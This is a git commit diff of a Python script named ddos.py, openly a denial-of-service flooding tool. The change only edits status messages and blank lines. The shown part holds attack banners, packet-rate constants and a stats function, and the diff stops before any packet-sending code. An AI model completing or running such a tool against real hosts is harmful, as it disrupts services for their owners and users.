932b4f67b2f63ecf45199b53755e2aacf0a2af3c
SRIRAM VIGNESH V <159048515+SRIRAM-VIGNESH-V@users.noreply.github.com>
2024-03-16 18:55:42 +0530

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,23 +1,19 @@
 import os, sys, time, datetime
-
 INFO_INIT_1 = '[DDoS] Starting the attack on the given IP '
 INFO_INIT_2 = '(Press CTRL+C to stop me)...'
 INFO_STATS = '[DDoS] Quitting, showing stats:'
-ATTACK_FIN = '[DDoS] Completed the attack  >:D'
+ATTACK_FIN = '[DDoS] Completed the attack'
 PKTS_CADENCE = 100
 PKTS_LEN = 1442
 DATA_LEN = 1000000
 DATA_STR = 'MB'
-
-
-
 def get_str_time():
 	return ('[' + (datetime.datetime.now()).strftime('%H:%M:%S') + ']')
 def diff():
 	return (datetime.datetime.now() - time_init)
 
 def stats():
-	return ('Time Elapsed: ' + str(diff()) + '\n' + '[+] Data sent: ' + str(diff().total_seconds() * PKTS_CADENCE * PKTS_LEN / DATA_LEN) + ' ' + DATA_STR + '\n')
+	return ('Time Elapsed: ' + str(diff()) + '\n' + 'Data sent: ' + str(diff().total_seconds() * PKTS_CADENCE * PKTS_LEN / DATA_LEN) + ' ' + DATA_STR + '\n')
 
 if __name__ == "__main__":
 
